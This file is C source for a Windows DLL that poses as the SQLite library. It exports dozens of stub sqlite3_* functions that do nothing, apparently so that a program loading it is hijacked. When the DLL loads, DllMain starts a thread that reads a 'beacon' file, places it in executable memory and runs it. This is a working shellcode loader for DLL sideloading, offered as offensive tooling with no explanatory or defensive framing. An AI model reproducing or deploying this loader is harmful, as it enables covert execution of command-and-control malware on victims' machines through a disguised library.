#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>


extern __declspec(dllexport) PVOID sqlite3_aggregate_context() {
    return NULL;
}
extern __declspec(dllexport) PVOID sqlite3_column_double() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_create_collation() {
    return NULL;
}
extern __declspec(dllexport) PVOID sqlite3_bind_double() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_set_authorizer() {
    return NULL;
}
extern __declspec(dllexport) PVOID sqlite3_bind_blob() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_open() {
    return NULL;
}
extern __declspec(dllexport) PVOID sqlite3_bind_text() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_bind_null() {
    return NULL;
}
extern __declspec(dllexport) PVOID sqlite3_interrupt() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_result_error() {
    return NULL;
}
extern __declspec(dllexport) PVOID sqlite3_bind_parameter_count() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_create_function() {
    return NULL;
}
extern __declspec(dllexport) PVOID sqlite3_load_extension() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_progress_handler() {
    return NULL;
}
extern __declspec(dllexport) PVOID sqlite3_result_blob() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_value_bytes() {
    return NULL;
}
extern __declspec(dllexport) PVOID sqlite3_enable_load_extension() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_trace() {
    return NULL;
}
extern __declspec(dllexport) PVOID sqlite3_value_blob() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_value_double() {
    return NULL;
}
extern __declspec(dllexport) PVOID sqlite3_prepare() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_column_text() {
    return NULL;
}
extern __declspec(dllexport) PVOID sqlite3_last_insert_rowid() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_changes() {
    return NULL;
}
extern __declspec(dllexport) PVOID sqlite3_column_count() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_column_type() {
    return NULL;
}
extern __declspec(dllexport) PVOID sqlite3_column_decltype() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_data_count() {
    return NULL;
}
extern __declspec(dllexport) PVOID sqlite3_column_int64() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_get_autocommit() {
    return NULL;
}
extern __declspec(dllexport) PVOID sqlite3_column_bytes() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_column_name() {
    return NULL;
}
extern __declspec(dllexport) PVOID sqlite3_column_blob() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_enable_shared_cache() {
    return NULL;
}
extern __declspec(dllexport) PVOID sqlite3_complete() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_libversion() {
    return NULL;
}
extern __declspec(dllexport) PVOID sqlite3_transfer_bindings() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_reset() {
    return NULL;
}
extern __declspec(dllexport) PVOID sqlite3_bind_parameter_name() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_errcode() {
    return NULL;
}
extern __declspec(dllexport) PVOID sqlite3_step() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_errmsg() {
    return NULL;
}
extern __declspec(dllexport) PVOID sqlite3_value_int64() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_value_type() {
    return NULL;
}
extern __declspec(dllexport) PVOID sqlite3_result_text() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_result_null() {
    return NULL;
}
extern __declspec(dllexport) PVOID sqlite3_close() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_value_text() {
    return NULL;
}
extern __declspec(dllexport) PVOID sqlite3_result_double() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_result_int64() {
    return NULL;
}
extern __declspec(dllexport) PVOID sqlite3_busy_timeout() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_user_data() {
    return NULL;
}
extern __declspec(dllexport) PVOID sqlite3_total_changes() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_finalize() {
    return NULL;
}
extern __declspec(dllexport) PVOID sqlite3_bind_int64() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_backup_remaining() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_create_function_v2() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_backup_init() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_open_v2() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_backup_finish() {
    return NULL;
}

extern __declspec(dllexport) PVOID sqlite3_sleep() {
    return NULL;
}

int Trikko() {
    FILE* fp;
    size_t size;
    unsigned char* buffer;

    // Open the binary file
    fp = fopen("place_your_beacon_file_here", "rb");
    if (!fp) {
        perror("Error opening file");
        return 1;
    }

    // Determine file size
    fseek(fp, 0, SEEK_END);
    size = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    // Allocate memory for the buffer
    buffer = (unsigned char*)malloc(size);
    if (!buffer) {
        perror("Memory allocation failed");
        fclose(fp);
        return 1;
    }

    // Read file content into buffer
    fread(buffer, 1, size, fp);
    fclose(fp);

    // Allocate executable memory
    void* exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!exec) {
        perror("VirtualAlloc failed");
        free(buffer);
        return 1;
    }

    // Copy buffer to executable memory
    memcpy(exec, buffer, size);
    free(buffer);

    // Execute the buffer as a function
    ((void(*)())exec)();

    return 0;
}
BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {

    switch (dwReason)
    {
        HANDLE u;
    case DLL_PROCESS_ATTACH:
        u = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) Trikko, NULL, 0, NULL);
        CloseHandle(u);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
